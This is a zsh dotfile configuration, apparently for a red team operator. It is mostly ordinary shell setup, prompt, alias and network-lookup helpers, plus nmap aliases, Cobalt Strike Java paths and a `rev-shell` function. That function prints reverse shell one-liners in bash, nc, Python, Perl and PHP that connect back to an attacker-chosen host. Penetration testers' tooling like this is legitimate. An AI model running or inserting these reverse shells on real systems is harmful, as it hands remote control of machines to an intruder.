# ~/.zshrc
# Red Team dotfiles configuration

# ----------------------
# Homebrew Configuration (macOS)
# ----------------------
# Static Homebrew environment (avoids subprocess on every shell start)
if [[ -d "/opt/homebrew" ]]; then
    export HOMEBREW_PREFIX="/opt/homebrew"
    export HOMEBREW_CELLAR="/opt/homebrew/Cellar"
    export HOMEBREW_REPOSITORY="/opt/homebrew"
    export PATH="/opt/homebrew/bin:/opt/homebrew/sbin${PATH+:$PATH}"
    export MANPATH="/opt/homebrew/share/man${MANPATH+:$MANPATH}:"
    export INFOPATH="/opt/homebrew/share/info:${INFOPATH:-}"
elif [[ -d "/usr/local/Homebrew" ]]; then
    export HOMEBREW_PREFIX="/usr/local"
    export HOMEBREW_CELLAR="/usr/local/Cellar"
    export HOMEBREW_REPOSITORY="/usr/local/Homebrew"
    export PATH="/usr/local/bin:/usr/local/sbin${PATH+:$PATH}"
    export MANPATH="/usr/local/share/man${MANPATH+:$MANPATH}:"
    export INFOPATH="/usr/local/share/info:${INFOPATH:-}"
fi

# Keep PATH updates deterministic and avoid duplicate entries on repeated reloads.
prepend_path_once() {
    local candidate="$1"
    if [[ -z "$candidate" ]]; then
        return
    fi
    case ":$PATH:" in
        *":$candidate:"*) ;;
        *) export PATH="$candidate:$PATH" ;;
    esac
}

append_path_once() {
    local candidate="$1"
    if [[ -z "$candidate" ]]; then
        return
    fi
    case ":$PATH:" in
        *":$candidate:"*) ;;
        *) export PATH="$PATH:$candidate" ;;
    esac
}

source_if_exists() {
    local file_path="$1"
    [[ -f "$file_path" ]] && source "$file_path"
}

# ----------------------
# Python 3.13 Configuration
# ----------------------
# Prefer Python 3.13 for compatibility with PyO3-based tools (NetExec, aardwolf)
# Must come AFTER Homebrew shellenv to override python@3.14
prepend_path_once "/opt/homebrew/opt/python@3.13/bin"

# ----------------------
# Warp Runtime Detection
# ----------------------
if [[ "${TERM_PROGRAM:-}" == "WarpTerminal" ]]; then
    export WARP_TERMINAL=1
    export DISABLE_AUTO_TITLE="true"
else
    export WARP_TERMINAL=0
fi

# ----------------------
# Red Team Shell Banner
# ----------------------
if command -v figlet &> /dev/null; then
    figlet -f slant "Red Team Shell"
else
    echo "🔴 Red Team Shell Ready"
fi

setopt autocd              # change directory just by typing its name
setopt correct            # auto correct mistakes
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt

WORDCHARS=${WORDCHARS//\/} # Don't consider certain characters part of the word

# hide EOL sign ('%')
PROMPT_EOL_MARK=""

# configure key keybindings
bindkey -e                                        # emacs key bindings
bindkey ' ' magic-space                           # do history expansion on space
bindkey '^[[3;5~' kill-word                       # ctrl + Supr
bindkey '^[[3~' delete-char                       # delete
bindkey '^[[1;5C' forward-word                    # ctrl + ->
bindkey '^[[1;5D' backward-word                   # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[Z' undo                               # shift + tab undo last action

# enable completion features - Enhanced for red team tools
# Add custom completions directory (Ludus, etc.)
fpath=($HOME/.config/zsh/completions $fpath)
autoload -Uz compinit
# Speed up compinit by checking cache once per day
if [[ -n ~/.cache/zcompdump(#qN.mh+24) ]]; then
    compinit -d ~/.cache/zcompdump
else
    compinit -C -d ~/.cache/zcompdump
fi

# Completion styling
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' # case insensitive tab completion
if [[ -n "${LS_COLORS:-}" ]]; then
    zstyle ':completion:*' list-colors "${(s.:.)${LS_COLORS:-}}" # colorize completions
fi
zstyle ':completion:*:descriptions' format '[%d]'
zstyle ':completion:*:warnings' format 'No matches found'
zstyle ':completion:*' group-name ''

# Red team tool specific completions
zstyle ':completion:*:*:nmap:*' file-patterns '*.xml:xml-files *.gnmap:gnmap-files *:all-files'

# History configurations - Enhanced for Red Team operations
HISTFILE=~/.zsh_history
HISTSIZE=10000
SAVEHIST=10000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space (good for sensitive commands)
setopt hist_verify            # show command with history expansion to user before running it
setopt hist_reduce_blanks     # remove superfluous blanks from history items
setopt inc_append_history     # write to history file immediately, not when shell exits

# force zsh to show the complete history
alias history="history 0"

# set a fancy prompt
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    # Red team prompt
    if [[ "${WARP_TERMINAL:-0}" == "1" ]]; then
        # Warp already displays location context, keep prompt compact.
        PROMPT='%F{red}⚡%f %F{%(#.red.green)}%n%f@%F{blue}%m%f %F{red}$%f '
    else
        PROMPT='%F{red}⚡%f %F{%(#.red.green)}%n%f@%F{blue}%m%f %F{cyan}%~%f %F{red}$%f '
    fi
    
    # Right prompt with exit code and job count
    RPROMPT='%(?.. %? %F{red}%B✘%b%f)%(1j. %j %F{yellow}%B⚙%b%f.)'

    # enable syntax-highlighting
    if [ -f /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
        source_if_exists /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
    elif [ -f /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
        source_if_exists /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
    fi
    ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
    ZSH_HIGHLIGHT_STYLES[default]=none
    ZSH_HIGHLIGHT_STYLES[unknown-token]=fg=red,bold
    ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
    ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[global-alias]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[path]=underline
    ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
    ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
    ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[command-substitution]=none
    ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[process-substitution]=none
    ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
    ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[assign]=none
    ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
    ZSH_HIGHLIGHT_STYLES[named-fd]=none
    ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
    ZSH_HIGHLIGHT_STYLES[arg0]=fg=green
    ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
    ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
else
    PROMPT='%n@%m:%~%# '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir (Warp manages title itself)
if [[ "${WARP_TERMINAL:-0}" == "1" ]]; then
    TERM_TITLE=""
else
    case "$TERM" in
    xterm*|rxvt*)
        TERM_TITLE=$'\e]0;%n@%m: %~\a'
        ;;
    *)
        ;;
    esac
fi

new_line_before_prompt=yes
precmd() {
    # Print the previously configured title
    print -Pnr -- "${TERM_TITLE:-}"

    # Print a new line before the prompt, but only if it is not the first line
    if [ "$new_line_before_prompt" = yes ]; then
        if [ -z "${_NEW_LINE_BEFORE_PROMPT:-}" ]; then
            _NEW_LINE_BEFORE_PROMPT=1
        else
            print ""
        fi
    fi
}

# enable color support of ls, less and man, and also add handy aliases
export CLICOLOR=YES
alias grep='grep --color=auto'
alias fgrep='fgrep --color=auto'
alias egrep='egrep --color=auto'
if diff --color=auto /dev/null /dev/null >/dev/null 2>&1; then
    alias diff='diff --color=auto'
fi
if command -v ip >/dev/null 2>&1; then
    if ip --help 2>&1 | grep -q -- '--color'; then
        alias ip='ip --color=auto'
    fi
fi

# Enhanced ls aliases with colors
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias lt='ls -altr'  # sort by time, newest last
alias lh='ls -alh'   # human readable sizes

# aliasr TUI launcher for pentest commands (installed via pipx/uv)
alias a='aliasr'

# Red team specific aliases
# External IP/local network commands with guarded fallbacks
_get_public_ip_from_url() {
    local family="$1"
    local provider_url="$2"
    local ip=""

    if command -v curl >/dev/null 2>&1; then
        if [[ "$family" == "6" ]]; then
            ip="$(curl -fsS -6 --max-time 4 "$provider_url" 2>/dev/null | tr -d '\r\n')"
        else
            ip="$(curl -fsS -4 --max-time 4 "$provider_url" 2>/dev/null | tr -d '\r\n')"
        fi
    elif command -v wget >/dev/null 2>&1; then
        ip="$(wget -qO- "$provider_url" 2>/dev/null | tr -d '\r\n')"
    else
        echo "Error: curl or wget is required for external IP lookup." >&2
        return 1
    fi

    if [[ -n "$ip" ]]; then
        print -r -- "$ip"
        return 0
    fi

    return 1
}

_get_public_ip() {
    local family="$1"
    local -a providers
    if [[ "$family" == "6" ]]; then
        providers=(
            "https://ifconfig.me/ip"
            "https://icanhazip.com"
            "https://api64.ipify.org"
        )
    else
        providers=(
            "https://ifconfig.me/ip"
            "https://ipinfo.io/ip"
            "https://icanhazip.com"
            "https://api.ipify.org"
        )
    fi

    local provider
    for provider in "${providers[@]}"; do
        if _get_public_ip_from_url "$family" "$provider"; then
            return 0
        fi
    done

    echo "Error: unable to determine external IPv${family} address from known providers." >&2
    return 1
}

myip() {
    _get_public_ip "4"
}

myip6() {
    _get_public_ip "6"
}

myip_alt() {
    _get_public_ip_from_url "4" "https://ipinfo.io/ip" || _get_public_ip "4"
}
alias myip-alt='myip_alt'

myip_check() {
    _get_public_ip_from_url "4" "https://icanhazip.com" || _get_public_ip "4"
}
alias myip-check='myip_check'

localip() {
    local ip=""
    if command -v ipconfig >/dev/null 2>&1; then
        ip="$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)"
    fi
    if [[ -z "$ip" ]] && command -v hostname >/dev/null 2>&1; then
        ip="$(hostname -I 2>/dev/null | awk '{print $1}')"
    fi
    if [[ -z "$ip" ]] && command -v ip >/dev/null 2>&1; then
        ip="$(ip route get 1 2>/dev/null | awk '{print $7; exit}')"
    fi
    if [[ -n "$ip" ]]; then
        print -r -- "$ip"
        return 0
    fi
    echo "Error: unable to determine local IP address." >&2
    return 1
}

_default_gateway() {
    local gateway=""
    if command -v route >/dev/null 2>&1; then
        gateway="$(route -n get default 2>/dev/null | awk '/gateway:/{print $2; exit}')"
    fi
    if [[ -z "$gateway" ]] && command -v ip >/dev/null 2>&1; then
        gateway="$(ip route 2>/dev/null | awk '/default/{print $3; exit}')"
    fi
    [[ -n "$gateway" ]] && print -r -- "$gateway"
}

_dns_servers() {
    local dns=""
    if command -v scutil >/dev/null 2>&1; then
        dns="$(scutil --dns 2>/dev/null | awk '/nameserver\\[[0-9]+\\]/{print $3}' | sort -u | tr '\n' ' ')"
    fi
    if [[ -z "$dns" ]] && [[ -f /etc/resolv.conf ]]; then
        dns="$(awk '/^nameserver/{print $2}' /etc/resolv.conf | tr '\n' ' ')"
    fi
    [[ -n "$dns" ]] && print -r -- "${dns% }"
}

# Function to get IP and store in variable for scripting
get_external_ip() {
    EXTERNAL_IP="$(myip)"
    if [[ -z "${EXTERNAL_IP:-}" ]]; then
        echo "Error: failed to resolve external IPv4 address." >&2
        return 1
    fi
    echo "External IP: $EXTERNAL_IP (stored in \$EXTERNAL_IP variable)"
}
alias ports='lsof -iTCP -sTCP:LISTEN -P -n'  # macOS-compatible
alias listening='lsof -iTCP -sTCP:LISTEN -P -n'
alias urlencode='python3 -c "import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))"'
alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))"'
# Fixed base64 functions (macOS compatible)
base64encode() {
    if (( $# != 1 )); then
        echo "Usage: base64encode <text>"
        return 1
    fi
    echo -n "$1" | base64
}
base64decode() {
    if (( $# != 1 )); then
        echo "Usage: base64decode <text>"
        return 1
    fi
    if echo -n "dGVzdA==" | base64 -D >/dev/null 2>&1; then
        echo -n "$1" | base64 -D
    elif echo -n "dGVzdA==" | base64 -d >/dev/null 2>&1; then
        echo -n "$1" | base64 -d
    else
        echo "Error: unsupported base64 decode flags on this host." >&2
        return 1
    fi
}
alias rot13='tr a-zA-Z n-za-mN-ZA-M'
alias hexdump='xxd'
alias strings='strings -a'

# enable auto-suggestions based on the history
if [ -f /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    source_if_exists /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh
elif [ -f /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    source_if_exists /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh
fi
# change suggestion color
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'

# ----------------------
# Red Team Operations
# ----------------------

# -- Web Servers --
# Start a simple HTTP server
http-server() {
    if ! command -v python3 >/dev/null 2>&1; then
        echo "Error: python3 is required for http-server." >&2
        return 1
    fi
    python3 -m http.server "$@"
}

webserver() {
    http-server 8080 "$@"
}

# Start a simple HTTPS server. Requires cert.pem and key.pem.
# Generate with: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
https-server() {
    if ! command -v python3 >/dev/null 2>&1; then
        echo "Error: python3 is required for https-server." >&2
        return 1
    fi
    python3 -m http.server --cert-file=cert.pem --key-file=key.pem "$@"
}

# -- Nmap --
# Scan top 1000 TCP ports with service and version detection
alias nmap-top-ports='nmap -sV -sC --top-ports=1000'

# -- Red Team Functions --
# Quick port scanner
quickscan() {
    if (( $# < 1 )); then
        echo "Usage: quickscan <target>"
        return 1
    fi
    if ! command -v nmap >/dev/null 2>&1; then
        echo "Error: nmap is required for quickscan." >&2
        return 1
    fi
    local target="$1"
    nmap -T4 -F "$target"
}

# Extract various archive types
extract() {
    if (( $# < 1 )); then
        echo "Usage: extract <file>"
        return 1
    fi

    local archive="$1"
    if [[ -f "$archive" ]]; then
        case "$archive" in
            *.tar.bz2)   tar xjf "$archive"     ;;
            *.tar.gz)    tar xzf "$archive"     ;;
            *.tar.xz)    tar xJf "$archive"     ;;
            *.bz2)       bunzip2 "$archive"     ;;
            *.rar)       unrar e "$archive"     ;;
            *.gz)        gunzip "$archive"      ;;
            *.tar)       tar xf "$archive"      ;;
            *.tbz2)      tar xjf "$archive"     ;;
            *.tgz)       tar xzf "$archive"     ;;
            *.zip)       unzip "$archive"       ;;
            *.Z)         uncompress "$archive"  ;;
            *.7z)        7z x "$archive"        ;;
            *)           echo "'$archive' cannot be extracted via extract()" ;;
        esac
    else
        echo "'$archive' is not a valid file"
    fi
}

# Find files containing specific text
findtext() {
    if (( $# < 1 )); then
        echo "Usage: findtext <search_term> [directory]"
        return 1
    fi
    local search_term="$1"
    local dir="${2:-.}"
    grep -r "$search_term" "$dir" 2>/dev/null
}

# Network information
netinfo() {
    local external_ipv4 local_ipv4 gateway dns_servers
    external_ipv4="$(myip 2>/dev/null || echo unavailable)"
    local_ipv4="$(localip 2>/dev/null || echo unavailable)"
    gateway="$(_default_gateway 2>/dev/null || true)"
    dns_servers="$(_dns_servers 2>/dev/null || true)"
    [[ -z "$gateway" ]] && gateway="unavailable"
    [[ -z "$dns_servers" ]] && dns_servers="unavailable"

    echo "=== Network Information ==="
    echo "External IPv4: $external_ipv4"
    echo "Local IP: $local_ipv4"
    echo "Gateway: $gateway"
    echo "DNS Servers: $dns_servers"
}

# -- Reverse Shell Generator --
rev-shell() {
    if (( $# < 3 )); then
        echo "Usage: rev-shell <type> <lhost> <lport>"
        echo "Types: bash, nc, python, perl, php"
        return 1
    fi
    local type="$1" lhost="$2" lport="$3"
    case "$type" in
        bash)   echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" ;;
        nc)     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" ;;
        python) echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" ;;
        perl)   echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
        php)    echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
        *)      echo "Unknown type: $type (use bash, nc, python, perl, php)" ;;
    esac
}

echo "Type /help for a list of commands."

# -- Help Command --
# Display a list of aliases and functions
/help() {
    echo "
🔴 Red Team Shell - Available Commands:

🚀 Web Servers:
    http-server / webserver: Start HTTP server (port 8000/8080)
    https-server: Start HTTPS server (requires cert.pem/key.pem)

🔍 Network & Scanning:
    nmap-top-ports <target>: Quick nmap scan of top 1000 ports
    quickscan <target>: Fast nmap scan (-T4 -F)
    myip: Show external IPv4 address
    myip6: Show external IPv6 address
    myip-alt / myip-check: Alternative IP services
    get_external_ip: Get IP and store in \$EXTERNAL_IP variable
    localip: Show local IP address
    netinfo: Display comprehensive network information
    ports / listening: Show listening TCP ports

📜 Encoding/Decoding:
    base64encode <text>: Base64 encode
    base64decode <text>: Base64 decode
    urlencode / urldecode <text>: URL encode/decode
    rot13: ROT13 cipher
    hexdump <file>: Hexadecimal dump

🛠️ Red Team Tools:
    a: Launch aliasr TUI for pentest commands
    rev-shell <type> <lhost> <lport>: Generate reverse shell
        Types: bash, nc, python, perl, php
    extract <file>: Extract various archive formats
    findtext <term> [dir]: Search for text in files

📁 File Operations:
    ll, la, l, lt, lh: Enhanced ls variants

🎥 Tmux (if available):
    Prefix + P: Start/Stop asciinema recording
    Prefix + N: Create new session
    Prefix + r: Reload tmux config
    Prefix + U: Open aliasr (send to pane)
    Prefix + K: Open aliasr (send + execute)
    Prefix + p/n: Previous/Next window

📚 Documentation:
    /help: This help message
    "
}

# OpenJDK@17 Configuration (Cobalt Strike)
# ----------------------
# Required for Cobalt Strike client operations
prepend_path_once "/opt/homebrew/opt/openjdk@17/bin"
export CPPFLAGS="-I/opt/homebrew/opt/openjdk@17/include"

# Go and pdtm paths
prepend_path_once "$HOME/go/bin"
prepend_path_once "$HOME/.pdtm/go/bin"

# pipx
append_path_once "$HOME/.local/bin"

# Load local overrides
# This file is NOT synced to git - create it manually on each machine
if [[ -f "$HOME/.zshrc.local" ]]; then
    source_if_exists "$HOME/.zshrc.local"
fi

# >>> VanguardForge env loader >>>
__load_vanguardforge_env() {
    setopt localoptions ksharrays
    local -a BASH_SOURCE
    BASH_SOURCE[0]='/opt/VanguardForge/load_env_from_secrets.sh'
    source /opt/VanguardForge/load_env_from_secrets.sh >/dev/null 2>&1 || true
}
if [[ -f /opt/VanguardForge/load_env_from_secrets.sh ]]; then
    __load_vanguardforge_env
fi
unset -f __load_vanguardforge_env
unset -f prepend_path_once
unset -f append_path_once
unset -f source_if_exists
# <<< VanguardForge env loader <<<
